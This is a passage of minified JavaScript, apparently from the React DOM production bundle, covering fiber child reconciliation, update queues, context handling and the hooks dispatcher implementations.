        f)
    }
    function i(v) {
        return e && v.alternate === null && (v.flags |= 2),
        v
    }
    function a(v, f, y, _) {
        return f === null || f.tag !== 6 ? (f = Xu(y, v.mode, _),
        f.return = v,
        f) : (f = o(f, y),
        f.return = v,
        f)
    }
    function l(v, f, y, _) {
        var b = y.type;
        return b === To ? c(v, f, y.props.children, _, y.key) : f !== null && (f.elementType === b || typeof b == "object" && b !== null && b.$$typeof === or && rh(b) === f.type) ? (_ = o(f, y.props),
        _.ref = Os(v, f, y),
        _.return = v,
        _) : (_ = Wa(y.type, y.key, y.props, null, v.mode, _),
        _.ref = Os(v, f, y),
        _.return = v,
        _)
    }
    function u(v, f, y, _) {
        return f === null || f.tag !== 4 || f.stateNode.containerInfo !== y.containerInfo || f.stateNode.implementation !== y.implementation ? (f = Ju(y, v.mode, _),
        f.return = v,
        f) : (f = o(f, y.children || []),
        f.return = v,
        f)
    }
    function c(v, f, y, _, b) {
        return f === null || f.tag !== 7 ? (f = Jr(y, v.mode, _, b),
        f.return = v,
        f) : (f = o(f, y),
        f.return = v,
        f)
    }
    function d(v, f, y) {
        if (typeof f == "string" && f !== "" || typeof f == "number")
            return f = Xu("" + f, v.mode, y),
            f.return = v,
            f;
        if (typeof f == "object" && f !== null) {
            switch (f.$$typeof) {
            case ca:
                return y = Wa(f.type, f.key, f.props, null, v.mode, y),
                y.ref = Os(v, null, f),
                y.return = v,
                y;
            case ko:
                return f = Ju(f, v.mode, y),
                f.return = v,
                f;
            case or:
                var _ = f._init;
                return d(v, _(f._payload), y)
            }
            if (Bs(f) || Ts(f))
                return f = Jr(f, v.mode, y, null),
                f.return = v,
                f;
            Sa(v, f)
        }
        return null
    }
    function p(v, f, y, _) {
        var b = f !== null ? f.key : null;
        if (typeof y == "string" && y !== "" || typeof y == "number")
            return b !== null ? null : a(v, f, "" + y, _);
        if (typeof y == "object" && y !== null) {
            switch (y.$$typeof) {
            case ca:
                return y.key === b ? l(v, f, y, _) : null;
            case ko:
                return y.key === b ? u(v, f, y, _) : null;
            case or:
                return b = y._init,
                p(v, f, b(y._payload), _)
            }
            if (Bs(y) || Ts(y))
                return b !== null ? null : c(v, f, y, _, null);
            Sa(v, y)
        }
        return null
    }
    function w(v, f, y, _, b) {
        if (typeof _ == "string" && _ !== "" || typeof _ == "number")
            return v = v.get(y) || null,
            a(f, v, "" + _, b);
        if (typeof _ == "object" && _ !== null) {
            switch (_.$$typeof) {
            case ca:
                return v = v.get(_.key === null ? y : _.key) || null,
                l(f, v, _, b);
            case ko:
                return v = v.get(_.key === null ? y : _.key) || null,
                u(f, v, _, b);
            case or:
                var T = _._init;
                return w(v, f, y, T(_._payload), b)
            }
            if (Bs(_) || Ts(_))
                return v = v.get(y) || null,
                c(f, v, _, b, null);
            Sa(f, _)
        }
        return null
    }
    function x(v, f, y, _) {
        for (var b = null, T = null, k = f, P = f = 0, z = null; k !== null && P < y.length; P++) {
            k.index > P ? (z = k,
            k = null) : z = k.sibling;
            var L = p(v, k, y[P], _);
            if (L === null) {
                k === null && (k = z);
                break
            }
            e && k && L.alternate === null && t(v, k),
            f = s(L, f, P),
            T === null ? b = L : T.sibling = L,
            T = L,
            k = z
        }
        if (P === y.length)
            return n(v, k),
            Ae && $r(v, P),
            b;
        if (k === null) {
            for (; P < y.length; P++)
                k = d(v, y[P], _),
                k !== null && (f = s(k, f, P),
                T === null ? b = k : T.sibling = k,
                T = k);
            return Ae && $r(v, P),
            b
        }
        for (k = r(v, k); P < y.length; P++)
            z = w(k, v, P, y[P], _),
            z !== null && (e && z.alternate !== null && k.delete(z.key === null ? P : z.key),
            f = s(z, f, P),
            T === null ? b = z : T.sibling = z,
            T = z);
        return e && k.forEach(function(X) {
            return t(v, X)
        }),
        Ae && $r(v, P),
        b
    }
    function m(v, f, y, _) {
        var b = Ts(y);
        if (typeof b != "function")
            throw Error(M(150));
        if (y = b.call(y),
        y == null)
            throw Error(M(151));
        for (var T = b = null, k = f, P = f = 0, z = null, L = y.next(); k !== null && !L.done; P++,
        L = y.next()) {
            k.index > P ? (z = k,
            k = null) : z = k.sibling;
            var X = p(v, k, L.value, _);
            if (X === null) {
                k === null && (k = z);
                break
            }
            e && k && X.alternate === null && t(v, k),
            f = s(X, f, P),
            T === null ? b = X : T.sibling = X,
            T = X,
            k = z
        }
        if (L.done)
            return n(v, k),
            Ae && $r(v, P),
            b;
        if (k === null) {
            for (; !L.done; P++,
            L = y.next())
                L = d(v, L.value, _),
                L !== null && (f = s(L, f, P),
                T === null ? b = L : T.sibling = L,
                T = L);
            return Ae && $r(v, P),
            b
        }
        for (k = r(v, k); !L.done; P++,
        L = y.next())
            L = w(k, v, P, L.value, _),
            L !== null && (e && L.alternate !== null && k.delete(L.key === null ? P : L.key),
            f = s(L, f, P),
            T === null ? b = L : T.sibling = L,
            T = L);
        return e && k.forEach(function(O) {
            return t(v, O)
        }),
        Ae && $r(v, P),
        b
    }
    function S(v, f, y, _) {
        if (typeof y == "object" && y !== null && y.type === To && y.key === null && (y = y.props.children),
        typeof y == "object" && y !== null) {
            switch (y.$$typeof) {
            case ca:
                e: {
                    for (var b = y.key, T = f; T !== null; ) {
                        if (T.key === b) {
                            if (b = y.type,
                            b === To) {
                                if (T.tag === 7) {
                                    n(v, T.sibling),
                                    f = o(T, y.props.children),
                                    f.return = v,
                                    v = f;
                                    break e
                                }
                            } else if (T.elementType === b || typeof b == "object" && b !== null && b.$$typeof === or && rh(b) === T.type) {
                                n(v, T.sibling),
                                f = o(T, y.props),
                                f.ref = Os(v, T, y),
                                f.return = v,
                                v = f;
                                break e
                            }
                            n(v, T);
                            break
                        } else
                            t(v, T);
                        T = T.sibling
                    }
                    y.type === To ? (f = Jr(y.props.children, v.mode, _, y.key),
                    f.return = v,
                    v = f) : (_ = Wa(y.type, y.key, y.props, null, v.mode, _),
                    _.ref = Os(v, f, y),
                    _.return = v,
                    v = _)
                }
                return i(v);
            case ko:
                e: {
                    for (T = y.key; f !== null; ) {
                        if (f.key === T)
                            if (f.tag === 4 && f.stateNode.containerInfo === y.containerInfo && f.stateNode.implementation === y.implementation) {
                                n(v, f.sibling),
                                f = o(f, y.children || []),
                                f.return = v,
                                v = f;
                                break e
                            } else {
                                n(v, f);
                                break
                            }
                        else
                            t(v, f);
                        f = f.sibling
                    }
                    f = Ju(y, v.mode, _),
                    f.return = v,
                    v = f
                }
                return i(v);
            case or:
                return T = y._init,
                S(v, f, T(y._payload), _)
            }
            if (Bs(y))
                return x(v, f, y, _);
            if (Ts(y))
                return m(v, f, y, _);
            Sa(v, y)
        }
        return typeof y == "string" && y !== "" || typeof y == "number" ? (y = "" + y,
        f !== null && f.tag === 6 ? (n(v, f.sibling),
        f = o(f, y),
        f.return = v,
        v = f) : (n(v, f),
        f = Xu(y, v.mode, _),
        f.return = v,
        v = f),
        i(v)) : n(v, f)
    }
    return S
}
var us = eg(!0)
  , tg = eg(!1)
  , fl = Lr(null)
  , pl = null
  , Io = null
  , af = null;
function lf() {
    af = Io = pl = null
}
function uf(e) {
    var t = fl.current;
    Pe(fl),
    e._currentValue = t
}
function qc(e, t, n) {
    for (; e !== null; ) {
        var r = e.alternate;
        if ((e.childLanes & t) !== t ? (e.childLanes |= t,
        r !== null && (r.childLanes |= t)) : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t),
        e === n)
            break;
        e = e.return
    }
}
function Bo(e, t) {
    pl = e,
    af = Io = null,
    e = e.dependencies,
    e !== null && e.firstContext !== null && (e.lanes & t && (kt = !0),
    e.firstContext = null)
}
function qt(e) {
    var t = e._currentValue;
    if (af !== e)
        if (e = {
            context: e,
            memoizedValue: t,
            next: null
        },
        Io === null) {
            if (pl === null)
                throw Error(M(308));
            Io = e,
            pl.dependencies = {
                lanes: 0,
                firstContext: e
            }
        } else
            Io = Io.next = e;
    return t
}
var Hr = null;
function cf(e) {
    Hr === null ? Hr = [e] : Hr.push(e)
}
function ng(e, t, n, r) {
    var o = t.interleaved;
    return o === null ? (n.next = n,
    cf(t)) : (n.next = o.next,
    o.next = n),
    t.interleaved = n,
    Kn(e, r)
}
function Kn(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (n !== null && (n.lanes |= t),
    n = e,
    e = e.return; e !== null; )
        e.childLanes |= t,
        n = e.alternate,
        n !== null && (n.childLanes |= t),
        n = e,
        e = e.return;
    return n.tag === 3 ? n.stateNode : null
}
var sr = !1;
function df(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: {
            pending: null,
            interleaved: null,
            lanes: 0
        },
        effects: null
    }
}
function rg(e, t) {
    e = e.updateQueue,
    t.updateQueue === e && (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects
    })
}
function Hn(e, t) {
    return {
        eventTime: e,
        lane: t,
        tag: 0,
        payload: null,
        callback: null,
        next: null
    }
}
function Sr(e, t, n) {
    var r = e.updateQueue;
    if (r === null)
        return null;
    if (r = r.shared,
    he & 2) {
        var o = r.pending;
        return o === null ? t.next = t : (t.next = o.next,
        o.next = t),
        r.pending = t,
        Kn(e, n)
    }
    return o = r.interleaved,
    o === null ? (t.next = t,
    cf(r)) : (t.next = o.next,
    o.next = t),
    r.interleaved = t,
    Kn(e, n)
}
function Va(e, t, n) {
    if (t = t.updateQueue,
    t !== null && (t = t.shared,
    (n & 4194240) !== 0)) {
        var r = t.lanes;
        r &= e.pendingLanes,
        n |= r,
        t.lanes = n,
        qd(e, n)
    }
}
function oh(e, t) {
    var n = e.updateQueue
      , r = e.alternate;
    if (r !== null && (r = r.updateQueue,
    n === r)) {
        var o = null
          , s = null;
        if (n = n.firstBaseUpdate,
        n !== null) {
            do {
                var i = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null
                };
                s === null ? o = s = i : s = s.next = i,
                n = n.next
            } while (n !== null);
            s === null ? o = s = t : s = s.next = t
        } else
            o = s = t;
        n = {
            baseState: r.baseState,
            firstBaseUpdate: o,
            lastBaseUpdate: s,
            shared: r.shared,
            effects: r.effects
        },
        e.updateQueue = n;
        return
    }
    e = n.lastBaseUpdate,
    e === null ? n.firstBaseUpdate = t : e.next = t,
    n.lastBaseUpdate = t
}
function hl(e, t, n, r) {
    var o = e.updateQueue;
    sr = !1;
    var s = o.firstBaseUpdate
      , i = o.lastBaseUpdate
      , a = o.shared.pending;
    if (a !== null) {
        o.shared.pending = null;
        var l = a
          , u = l.next;
        l.next = null,
        i === null ? s = u : i.next = u,
        i = l;
        var c = e.alternate;
        c !== null && (c = c.updateQueue,
        a = c.lastBaseUpdate,
        a !== i && (a === null ? c.firstBaseUpdate = u : a.next = u,
        c.lastBaseUpdate = l))
    }
    if (s !== null) {
        var d = o.baseState;
        i = 0,
        c = u = l = null,
        a = s;
        do {
            var p = a.lane
              , w = a.eventTime;
            if ((r & p) === p) {
                c !== null && (c = c.next = {
                    eventTime: w,
                    lane: 0,
                    tag: a.tag,
                    payload: a.payload,
                    callback: a.callback,
                    next: null
                });
                e: {
                    var x = e
                      , m = a;
                    switch (p = t,
                    w = n,
                    m.tag) {
                    case 1:
                        if (x = m.payload,
                        typeof x == "function") {
                            d = x.call(w, d, p);
                            break e
                        }
                        d = x;
                        break e;
                    case 3:
                        x.flags = x.flags & -65537 | 128;
                    case 0:
                        if (x = m.payload,
                        p = typeof x == "function" ? x.call(w, d, p) : x,
                        p == null)
                            break e;
                        d = Ie({}, d, p);
                        break e;
                    case 2:
                        sr = !0
                    }
                }
                a.callback !== null && a.lane !== 0 && (e.flags |= 64,
                p = o.effects,
                p === null ? o.effects = [a] : p.push(a))
            } else
                w = {
                    eventTime: w,
                    lane: p,
                    tag: a.tag,
                    payload: a.payload,
                    callback: a.callback,
                    next: null
                },
                c === null ? (u = c = w,
                l = d) : c = c.next = w,
                i |= p;
            if (a = a.next,
            a === null) {
                if (a = o.shared.pending,
                a === null)
                    break;
                p = a,
                a = p.next,
                p.next = null,
                o.lastBaseUpdate = p,
                o.shared.pending = null
            }
        } while (!0);
        if (c === null && (l = d),
        o.baseState = l,
        o.firstBaseUpdate = u,
        o.lastBaseUpdate = c,
        t = o.shared.interleaved,
        t !== null) {
            o = t;
            do
                i |= o.lane,
                o = o.next;
            while (o !== t)
        } else
            s === null && (o.shared.lanes = 0);
        so |= i,
        e.lanes = i,
        e.memoizedState = d
    }
}
function sh(e, t, n) {
    if (e = t.effects,
    t.effects = null,
    e !== null)
        for (t = 0; t < e.length; t++) {
            var r = e[t]
              , o = r.callback;
            if (o !== null) {
                if (r.callback = null,
                r = n,
                typeof o != "function")
                    throw Error(M(191, o));
                o.call(r)
            }
        }
}
var ea = {}
  , kn = Lr(ea)
  , yi = Lr(ea)
  , wi = Lr(ea);
function Wr(e) {
    if (e === ea)
        throw Error(M(174));
    return e
}
function ff(e, t) {
    switch (Ce(wi, t),
    Ce(yi, e),
    Ce(kn, ea),
    e = t.nodeType,
    e) {
    case 9:
    case 11:
        t = (t = t.documentElement) ? t.namespaceURI : Nc(null, "");
        break;
    default:
        e = e === 8 ? t.parentNode : t,
        t = e.namespaceURI || null,
        e = e.tagName,
        t = Nc(t, e)
    }
    Pe(kn),
    Ce(kn, t)
}
function cs() {
    Pe(kn),
    Pe(yi),
    Pe(wi)
}
function og(e) {
    Wr(wi.current);
    var t = Wr(kn.current)
      , n = Nc(t, e.type);
    t !== n && (Ce(yi, e),
    Ce(kn, n))
}
function pf(e) {
    yi.current === e && (Pe(kn),
    Pe(yi))
}
var je = Lr(0);
function ml(e) {
    for (var t = e; t !== null; ) {
        if (t.tag === 13) {
            var n = t.memoizedState;
            if (n !== null && (n = n.dehydrated,
            n === null || n.data === "$?" || n.data === "$!"))
                return t
        } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
            if (t.flags & 128)
                return t
        } else if (t.child !== null) {
            t.child.return = t,
            t = t.child;
            continue
        }
        if (t === e)
            break;
        for (; t.sibling === null; ) {
            if (t.return === null || t.return === e)
                return null;
            t = t.return
        }
        t.sibling.return = t.return,
        t = t.sibling
    }
    return null
}
var Zu = [];
function hf() {
    for (var e = 0; e < Zu.length; e++)
        Zu[e]._workInProgressVersionPrimary = null;
    Zu.length = 0
}
var za = Xn.ReactCurrentDispatcher
  , Ku = Xn.ReactCurrentBatchConfig
  , oo = 0
  , Me = null
  , Qe = null
  , Xe = null
  , vl = !1
  , ei = !1
  , xi = 0
  , $S = 0;
function at() {
    throw Error(M(321))
}
function mf(e, t) {
    if (t === null)
        return !1;
    for (var n = 0; n < t.length && n < e.length; n++)
        if (!fn(e[n], t[n]))
            return !1;
    return !0
}
function vf(e, t, n, r, o, s) {
    if (oo = s,
    Me = t,
    t.memoizedState = null,
    t.updateQueue = null,
    t.lanes = 0,
    za.current = e === null || e.memoizedState === null ? WS : ZS,
    e = n(r, o),
    ei) {
        s = 0;
        do {
            if (ei = !1,
            xi = 0,
            25 <= s)
                throw Error(M(301));
            s += 1,
            Xe = Qe = null,
            t.updateQueue = null,
            za.current = KS,
            e = n(r, o)
        } while (ei)
    }
    if (za.current = gl,
    t = Qe !== null && Qe.next !== null,
    oo = 0,
    Xe = Qe = Me = null,
    vl = !1,
    t)
        throw Error(M(300));
    return e
}
function gf() {
    var e = xi !== 0;
    return xi = 0,
    e
}
function yn() {
    var e = {
        memoizedState: null,
        baseState: null,
        baseQueue: null,
        queue: null,
        next: null
    };
    return Xe === null ? Me.memoizedState = Xe = e : Xe = Xe.next = e,
    Xe
}
function Gt() {
    if (Qe === null) {
        var e = Me.alternate;
        e = e !== null ? e.memoizedState : null
    } else
        e = Qe.next;
    var t = Xe === null ? Me.memoizedState : Xe.next;
    if (t !== null)
        Xe = t,
        Qe = e;
    else {
        if (e === null)
            throw Error(M(310));
        Qe = e,
        e = {
            memoizedState: Qe.memoizedState,
            baseState: Qe.baseState,
            baseQueue: Qe.baseQueue,
            queue: Qe.queue,
            next: null
        },
        Xe === null ? Me.memoizedState = Xe = e : Xe = Xe.next = e
    }
    return Xe
}
function Si(e, t) {
    return typeof t == "function" ? t(e) : t
}
function Qu(e) {
    var t = Gt()
      , n = t.queue;
    if (n === null)
        throw Error(M(311));
    n.lastRenderedReducer = e;
    var r = Qe
      , o = r.baseQueue
      , s = n.pending;
    if (s !== null) {
        if (o !== null) {
            var i = o.next;
            o.next = s.next,
            s.next = i
        }
        r.baseQueue = o = s,
        n.pending = null
    }
    if (o !== null) {
        s = o.next,
        r = r.baseState;
        var a = i = null
          , l = null
          , u = s;
        do {
            var c = u.lane;
            if ((oo & c) === c)
                l !== null && (l = l.next = {
                    lane: 0,
                    action: u.action,
                    hasEagerState: u.hasEagerState,
                    eagerState: u.eagerState,
                    next: null
                }),
                r = u.hasEagerState ? u.eagerState : e(r, u.action);
            else {
                var d = {
                    lane: c,
                    action: u.action,
                    hasEagerState: u.hasEagerState,
                    eagerState: u.eagerState,
                    next: null
                };
                l === null ? (a = l = d,
                i = r) : l = l.next = d,
                Me.lanes |= c,
                so |= c
            }
            u = u.next
        } while (u !== null && u !== s);
        l === null ? i = r : l.next = a,
        fn(r, t.memoizedState) || (kt = !0),
        t.memoizedState = r,
        t.baseState = i,
        t.baseQueue = l,
        n.lastRenderedState = r
    }
    if (e = n.interleaved,
    e !== null) {
        o = e;
        do
            s = o.lane,
            Me.lanes |= s,
            so |= s,
            o = o.next;
        while (o !== e)
    } else
        o === null && (n.lanes = 0);
    return [t.memoizedState, n.dispatch]
}
function qu(e) {
    var t = Gt()
      , n = t.queue;
    if (n === null)
        throw Error(M(311));
    n.lastRenderedReducer = e;
    var r = n.dispatch
      , o = n.pending
      , s = t.memoizedState;
    if (o !== null) {
        n.pending = null;
        var i = o = o.next;
        do
            s = e(s, i.action),
            i = i.next;
        while (i !== o);
        fn(s, t.memoizedState) || (kt = !0),
        t.memoizedState = s,
        t.baseQueue === null && (t.baseState = s),
        n.lastRenderedState = s
    }
    return [s, r]
}
function sg() {}
function ig(e, t) {
    var n = Me
      , r = Gt()
      , o = t()
      , s = !fn(r.memoizedState, o);
    if (s && (r.memoizedState = o,
    kt = !0),
    r = r.queue,
    yf(ug.bind(null, n, r, e), [e]),
    r.getSnapshot !== t || s || Xe !== null && Xe.memoizedState.tag & 1) {
        if (n.flags |= 2048,
        _i(9, lg.bind(null, n, r, o, t), void 0, null),
        Je === null)
            throw Error(M(349));
        oo & 30 || ag(n, t, o)
    }
    return o
}
function ag(e, t, n) {
    e.flags |= 16384,
    e = {
        getSnapshot: t,
        value: n
    },
    t = Me.updateQueue,
    t === null ? (t = {
        lastEffect: null,
        stores: null
    },
    Me.updateQueue = t,
    t.stores = [e]) : (n = t.stores,
    n === null ? t.stores = [e] : n.push(e))
}
function lg(e, t, n, r) {
    t.value = n,
    t.getSnapshot = r,
    cg(t) && dg(e)
}
function ug(e, t, n) {
    return n(function() {
        cg(t) && dg(e)
    })
}
function cg(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !fn(e, n)
    } catch {
        return !0
    }
}
function dg(e) {
    var t = Kn(e, 1);
    t !== null && cn(t, e, 1, -1)
}
function ih(e) {
    var t = yn();
    return typeof e == "function" && (e = e()),
    t.memoizedState = t.baseState = e,
    e = {
        pending: null,
        interleaved: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: Si,
        lastRenderedState: e
    },
    t.queue = e,
    e = e.dispatch = HS.bind(null, Me, e),
    [t.memoizedState, e]
}
function _i(e, t, n, r) {
    return e = {
        tag: e,
        create: t,
        destroy: n,
        deps: r,
        next: null
    },
    t = Me.updateQueue,
    t === null ? (t = {
        lastEffect: null,
        stores: null
    },
    Me.updateQueue = t,
    t.lastEffect = e.next = e) : (n = t.lastEffect,
    n === null ? t.lastEffect = e.next = e : (r = n.next,
    n.next = e,
    e.next = r,
    t.lastEffect = e)),
    e
}
function fg() {
    return Gt().memoizedState
}
function $a(e, t, n, r) {
    var o = yn();
    Me.flags |= e,
    o.memoizedState = _i(1 | t, n, void 0, r === void 0 ? null : r)
}
function Yl(e, t, n, r) {
    var o = Gt();
    r = r === void 0 ? null : r;
    var s = void 0;
    if (Qe !== null) {
        var i = Qe.memoizedState;
        if (s = i.destroy,
        r !== null && mf(r, i.deps)) {
            o.memoizedState = _i(t, n, s, r);
            return
        }
    }
    Me.flags |= e,
    o.memoizedState = _i(1 | t, n, s, r)
}
function ah(e, t) {
    return $a(8390656, 8, e, t)
}
function yf(e, t) {
    return Yl(2048, 8, e, t)
}
function pg(e, t) {
    return Yl(4, 2, e, t)
}
function hg(e, t) {
    return Yl(4, 4, e, t)
}
function mg(e, t) {
    if (typeof t == "function")
        return e = e(),
        t(e),
        function() {
            t(null)
        }
        ;
    if (t != null)
        return e = e(),
        t.current = e,
        function() {
            t.current = null
        }
}
function vg(e, t, n) {
    return n = n != null ? n.concat([e]) : null,
    Yl(4, 4, mg.bind(null, t, e), n)
}
function wf() {}
function gg(e, t) {
    var n = Gt();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && mf(t, r[1]) ? r[0] : (n.memoizedState = [e, t],
    e)
}
function yg(e, t) {
    var n = Gt();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && mf(t, r[1]) ? r[0] : (e = e(),
    n.memoizedState = [e, t],
    e)
}
function wg(e, t, n) {
    return oo & 21 ? (fn(n, t) || (n = bv(),
    Me.lanes |= n,
    so |= n,
    e.baseState = !0),
    t) : (e.baseState && (e.baseState = !1,
    kt = !0),
    e.memoizedState = n)
}
function US(e, t) {
    var n = Ee;
    Ee = n !== 0 && 4 > n ? n : 4,
    e(!0);
    var r = Ku.transition;
    Ku.transition = {};
    try {
        e(!1),
        t()
    } finally {
        Ee = n,
        Ku.transition = r
    }
}
function xg() {
    return Gt().memoizedState
}
function BS(e, t, n) {
    var r = Er(e);
    if (n = {
        lane: r,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null
    },
    Sg(e))
        _g(t, n);
    else if (n = ng(e, t, n, r),
    n !== null) {
        var o = yt();
        cn(n, e, r, o),
        Eg(n, t, r)
    }
}
function HS(e, t, n) {
    var r = Er(e)
      , o = {
        lane: r,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null
    };
    if (Sg(e))
        _g(t, o);
    else {
        var s = e.alternate;
        if (e.lanes === 0 && (s === null || s.lanes === 0) && (s = t.lastRenderedReducer,
        s !== null))
            try {
                var i = t.lastRenderedState
                  , a = s(i, n);
                if (o.hasEagerState = !0,
                o.eagerState = a,
                fn(a, i)) {
                    var l = t.interleaved;
                    l === null ? (o.next = o,
                    cf(t)) : (o.next = l.next,
                    l.next = o),
                    t.interleaved = o;
                    return
                }
            } catch {} finally {}
        n = ng(e, t, o, r),
        n !== null && (o = yt(),
        cn(n, e, r, o),
        Eg(n, t, r))
    }
}
function Sg(e) {
    var t = e.alternate;
    return e === Me || t !== null && t === Me
}
function _g(e, t) {
    ei = vl = !0;
    var n = e.pending;
    n === null ? t.next = t : (t.next = n.next,
    n.next = t),
    e.pending = t
}
function Eg(e, t, n) {
    if (n & 4194240) {
        var r = t.lanes;
        r &= e.pendingLanes,
        n |= r,
        t.lanes = n,
        qd(e, n)
    }
}
var gl = {
    readContext: qt,
    useCallback: at,
    useContext: at,
    useEffect: at,
    useImperativeHandle: at,
    useInsertionEffect: at,
    useLayoutEffect: at,
    useMemo: at,
    useReducer: at,
    useRef: at,
    useState: at,
    useDebugValue: at,
    useDeferredValue: at,
    useTransition: at,
    useMutableSource: at,
    useSyncExternalStore: at,
    useId: at,
    unstable_isNewReconciler: !1
}
  , WS = {
    readContext: qt,
    useCallback: function(e, t) {
        return yn().memoizedState = [e, t === void 0 ? null : t],
        e
    },
    useContext: qt,
    useEffect: ah,
    useImperativeHandle: function(e, t, n) {
        return n = n != null ? n.concat([e]) : null,
        $a(4194308, 4, mg.bind(null, t, e), n)
    },
    useLayoutEffect: function(e, t) {
        return $a(4194308, 4, e, t)
    },
    useInsertionEffect: function(e, t) {
        return $a(4, 2, e, t)
    },
    useMemo: function(e, t) {
        var n = yn();
        return t = t === void 0 ? null : t,
        e = e(),
        n.memoizedState = [e, t],
        e
    },
    useReducer: function(e, t, n) {
        var r = yn();
        return t = n !== void 0 ? n(t) : t,
        r.memoizedState = r.baseState = t,
        e = {
            pending: null,
            interleaved: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: e,
            lastRenderedState: t
        },
        r.queue = e,
        e = e.dispatch = BS.bind(null, Me, e),
        [r.memoizedState, e]
    },
    useRef: function(e) {
        var t = yn();
        return e = {
            current: e
        },
        t.memoizedState = e
    },
    useState: ih,
    useDebugValue: wf,
    useDeferredValue: function(e) {
        return yn().memoizedState = e
    },
    useTransition: function() {
        var e = ih(!1)
          , t = e[0];
        return e = US.bind(null, e[1]),
        yn().memoizedState = e,
        [t, e]
    },
    useMutableSource: function() {},
    useSyncExternalStore: function(e, t, n) {
        var r = Me
          , o = yn();
        if (Ae) {
            if (n === void 0)
                throw Error(M(407));
            n = n()
        } else {
            if (n = t(),
            Je === null)
                throw Error(M(349));
            oo & 30 || ag(r, t, n)
        }
        o.memoizedState = n;
        var s = {
            value: n,
            getSnapshot: t
        };
        return o.queue = s,
        ah(ug.bind(null, r, s, e), [e]),
        r.flags |= 2048,
        _i(9, lg.bind(null, r, s, n, t), void 0, null),
        n
    },
    useId: function() {
        var e = yn()
          , t = Je.identifierPrefix;
        if (Ae) {
            var n = Un
              , r = $n;
            n = (r & ~(1 << 32 - un(r) - 1)).toString(32) + n,
            t = ":" + t + "R" + n,
            n = xi++,
            0 < n && (t += "H" + n.toString(32)),
            t += ":"
        } else
            n = $S++,
            t = ":" + t + "r" + n.toString(32) + ":";
        return e.memoizedState = t
    },
    unstable_isNewReconciler: !1
}
  , ZS = {
    readContext: qt,
    useCallback: gg,
    useContext: qt,
    useEffect: yf,
    useImperativeHandle: vg,
    useInsertionEffect: pg,
    useLayoutEffect: hg,
    useMemo: yg,
    useReducer: Qu,
    useRef: fg,
    useState: function() {
        return Qu(Si)
    },
    useDebugValue: wf,
    useDeferredValue: function(e) {
        var t = Gt();
        return wg(t, Qe.memoizedState, e)
    },
    useTransition: function() {
        var e = Qu(Si)[0]
          , t = Gt().memoizedState;
        return [e, t]
    },
    useMutableSource: sg,
    useSyncExternalStore: ig,
    useId: xg,
    unstable_isNewReconciler: !1
}
  , KS = {
    readContext: qt,
    useCallback: gg,
    useContext: qt,
    useEffect: yf,
    useImperativeHandle: vg,
    useInsertionEffect: pg,
    useLayoutEffect: hg,
    useMemo: yg,
    useReducer: qu,
    useRef: fg,
    useState: function() {
        return qu(Si)
    },
    useDebugValue: wf,
    useDeferredValue: function(e) {
        var t = Gt();
        return Qe === null ? t.memoizedState = e : wg(t, Qe.memoizedState, e)
    },
    useTransition: function() {
        var e = qu(Si)[0]
          , t = Gt().memoizedState;
        return [e, t]
    },
    useMutableSource: sg,
    useSyncExternalStore: ig,
    useId: xg,
    unstable_isNewReconciler: !1
};
function Jt(e, t) {
    if (e && e.defaultProps) {
        t = Ie({}, t),
        e = e.defaultProps;
        for (var n in e)
            t[n] === void 0 && (t[n] = e[n]);
        return t
    }
    return t
}
function Gc(e, t, n, r) {
    t = e.memoizedState,
    n = n(r, t),
    n = n == null ? t : Ie({}, t, n),
    e.memoizedState = n,
    e.lanes === 0 && (e.updateQueue.baseState = n)
}
var Xl = {
    isMounted: function(e) {
        return (e = e._reactInternals) ? ho(e) === e : !1
    },
    enqueueSetState: function(e, t, n) {
        e = e._reactInternals;
        var r = yt()
          , o = Er(e)
          , s = Hn(r, o);
        s.payload = t,
        n != null && (s.callback = n),
        t = Sr(e, s, o),
        t !== null && (cn(t, e, o, r),
        Va(t, e, o))
    },
    enqueueReplaceState: function(e, t, n) {
        e = e._reactInternals;
        var r = yt()
          , o = Er(e)
          , s = Hn(r, o);
        s.tag = 1,
        s.payload = t,
        n != null && (s.callback = n),
        t = Sr(e, s, o),
        t !== null && (cn(t, e, o, r),
        Va(t, e, o))
    },
    enqueueForceUpdate: function(e, t) {
        e = e._reactInternals;
        var n = yt()
          , r = Er(e)
          , o = Hn(n, r);
        o.tag = 2,
        t != null && (o.callback = t),
        t = Sr(e, o, r),
        t !== null && (cn(t, e, r, n),
        Va(t, e, r))
    }
};
function lh(e, t, n, r, o, s, i) {
    return e = e.stateNode,
    typeof e.shouldComponentUpdate == "function" ? e.shouldComponentUpdate(r, s, i) : t.prototype && t.prototype.isPureReactComponent ? !hi(n, r) || !hi(o, s) : !0
}
function bg(e, t, n) {
    var r = !1
      , o = kr
      , s = t.contextType;
    return typeof s == "object" && s !== null ? s = qt(s) : (o = Pt(t) ? no : dt.current,
    r = t.contextTypes,
    s = (r = r != null) ? as(e, o) : kr),
    t = new t(n,s),
    e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null,
    t.updater = Xl,
    e.stateNode = t,
    t._reactInternals = e,
    r && (e = e.stateNode,
    e.__reactInternalMemoizedUnmaskedChildContext = o,
    e.__reactInternalMemoizedMaskedChildContext = s),
    t
}
function uh(e, t, n, r) {
    e = t.state,
    typeof t.componentWillReceiveProps == "function" && t.componentWillReceiveProps(n, r),
    typeof t.UNSAFE_componentWillReceiveProps == "function" && t.UNSAFE_componentWillReceiveProps(n, r),
    t.state !== e && Xl.enqueueReplaceState(t, t.state, null)
}
function Yc(e, t, n, r) {
    var o = e.stateNode;
    o.props = n,
    o.state = e.memoizedState,
    o.refs = {},
    df(e);
    var s = t.contextType;
